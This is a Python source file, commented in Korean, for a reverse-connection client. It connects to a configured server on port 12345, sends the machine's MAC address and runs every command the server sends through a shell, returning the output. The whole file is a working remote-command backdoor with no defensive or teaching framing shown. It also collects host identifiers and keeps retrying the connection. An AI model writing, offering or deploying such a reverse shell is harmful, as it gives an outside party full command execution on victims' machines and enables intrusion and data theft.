import socket
import os
import subprocess
import sys
from select import *
from time import ctime



class Client:
    BUFSIZE = 1024
    SERVER_IP_PORT_INFO = ()
    CLIENT_SOCKET = ""
    CLIENT_MACADDR = {}


    def getMacAddress(self):
        arrinfo = {}
        isdevice = 0
        mk = 0

        if sys.platform == 'win32':
            for line in os.popen("ipconfig /all"):
            # popen : 시스템 명령어를 실행한 결괏값을 읽기 모드 형태의 파일 객채로 돌려준다.
                if line.lstrip().startswith('호스트'):
                    host = line.split(':')[1].strip()
                
                else:
                        # 네트워크 어댑터가 터널 상태일 경우
                    if line.lstrip().startswith('이더넷 어댑터 로컬') or line.lstrip().startswith('이더넷 어댑터 이더넷'):
                        isdevice = 1

                    if isdevice == 1:
                        if line.lstrip().startswith('미디어 상태'):
                            desc = line.split(':')[1].strip()
                            if desc == '미디어 연결 끊김':
                                isdevice = 0

                        if line.lstrip().startswith('설명'):
                            desc = line.split(':')[1].strip()
                            if desc.lstrip().startswith('Bluetooth'):
                                isdevice = 0

                        if line.lstrip().startswith('물리적'):
                            mac = line.split(':')[1].strip()
                            arrinfo[host] = mac
                            isdevice = 0
                            mk += 1 # 맥주소 쌓아놓는 인덱스 값 해놓는것
        print(arrinfo)
        return arrinfo
                

    def client_recv(self,clientSocket,server_ip_port_info):
        
        while True:
            try:
                data = clientSocket.recv(self.BUFSIZE)
                print(data.decode("cp949"))
            except ConnectionResetError:
                print("[INFO][%s] 서버의 연결이 종료되었습니다." % ctime())
                clientSocket.close()
                sys.exit()

            if data.decode("cp949") == "":
                continue

        
            cd_msg = data.decode("cp949")
            
            
            if cd_msg[:2] == 'cd':
            #만약 서버에서 보낸 요청에서 첫 문자가 cd 일 경우 
                
                os.chdir(cd_msg[3:])
                continue

            if len(data) > 0:
                
                if data.decode("cp949") == "quit":
                    # 서버 측에서 종료가 될 경우에는 bytes 형식으로 ''을 보냄, 즉 다음과 같이 검출
                    print('서버 (%s:%s)와의 연결이 종료되었습니다.' % server_ip_port_info)
                    clientSocket.close()
                    sys.exit()
                    # 서버 측으로부터 quit 메세지를 받았을때 
                    break
                    return
               
            
                # 클라이언트 cmd 창도 종료

                # cd 명령이 아닌 다른 명령일 경우
                # 서버로부터 요청 명령이 날라올 경우 subprocess를 통해서 프로세스 하나를 실행
                

                cmd = subprocess.Popen(data[:].decode("cp949"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # shell = True : 별도의 서브 쉘을 실행하고 해당 쉘 위에서 명령을 실행하도록 함
                # reverse connection : 서버 측에서 보낸 메세지를 확인하여 명령어로 판단하고 클라이언트에서 서브 프로세스를 생성을 하여 명령을 실행
                
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                
                server_request_str = str(output_bytes.decode("cp949"))
                clientSocket.send(str.encode(server_request_str + "\n" + str(os.getcwd()) + "> ","cp949"))
                # 클라이언트가 수행한 작업을 서버측에서 확인이 가능하도록 다시 보내줌
                # os.getcwd() : 자신의 현재 디렉토리 위치를 보여줌, 즉 프롬프트처럼 표시되도록 하는것

                print(server_request_str)
                # 서버측에서 요청한 명령을 실행

    def server_info_setting(self):

        server_ip_port = []
        
        setting_file = open("./client_setting.ini",'w')
        
        print("처음 사용자 입니다. 서버 정보를 등록합니다.")

        server_ip = input("서버 IP 입력 : ")
        server_ip_port.append(server_ip)
        server_ip_port.append(12345)
        
        self.SERVER_IP_PORT_INFO = tuple(server_ip_port)

        line = ("#" * 20) + " Server IP " + ("#" * 20) + "\n"
        setting_file.write(line)
        
        line = server_ip_port[0] + "\n"
        setting_file.write(line)
        
        line = ("#" * 20) + " Server Port Number " + ("#" * 20) + "\n"
        setting_file.write(line)

        line = str(server_ip_port[1]) + "\n"
        setting_file.write(line)
        
        setting_file.close()

        




    def client_setting_check(self):

        try:
            
            setting_file = open("./client_setting.ini",'r')
            
            while True:
                line = setting_file.readline()
                if not line:
                    
                    setting_file.close()
                    break

                else:
                    continue

        except FileNotFoundError:
            self.server_info_setting()

        
            

    def connectToServer(self):
        server_ip_port = []
       
        
        getServerInfo = open("./client_setting.ini",'r')
        
        while True:
            line = getServerInfo.readline()
            if not line:
                break

            if line.lstrip().startswith(("#" * 20)):
                line = getServerInfo.readline().strip()
                if len(line) == 5:
                    line = int(line)

                server_ip_port.append(line)

            
        self.SERVER_IP_PORT_INFO = tuple(server_ip_port)
        print(self.SERVER_IP_PORT_INFO)
        
        clientConnectFlag = False
        
        while not clientConnectFlag:
            try:
                flag = self.CLIENT_SOCKET.connect(self.SERVER_IP_PORT_INFO)

                if flag == None:
                    break
            except ConnectionRefusedError:
                continue



        print('서버(%s:%s) 에 연결 되었습니다.' % self.SERVER_IP_PORT_INFO)
        
        print(str(self.CLIENT_MACADDR.values()))
        self.CLIENT_SOCKET.send(list(self.CLIENT_MACADDR.values())[0].encode("cp949"))
        
        while True:
            try:
                # read_socket, write_socket, error_socket = select(connection_list, [], [], 10)
                connection_list = [self.CLIENT_SOCKET]
                read_socket, write_socket, error_socket = select(connection_list, [],[],10)

                for sock in read_socket:
                    if sock == self.CLIENT_SOCKET:

                        self.client_recv(self.CLIENT_SOCKET, self.SERVER_IP_PORT_INFO)

            except KeyboardInterrupt:
                print("Ctrl + C 로 인한 클라이언트 종료")
                self.CLIENT_SOCKET.close()
                sys.exit()

    def __init__(self):
        
        self.CLIENT_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        

        # 클라이언트 소켓 생성
        self.CLIENT_MACADDR = self.getMacAddress()
        # 클라이언트 맥 주소 수집
        # 클라이언트가 설치 될때 수집

    
if __name__ == "__main__":

    Client = Client()

    # 객체를 생성할 때부터 알아서 맥주소를 알아내서 가지고 있음

    Client.client_setting_check()
    Client.connectToServer()

   
    

    
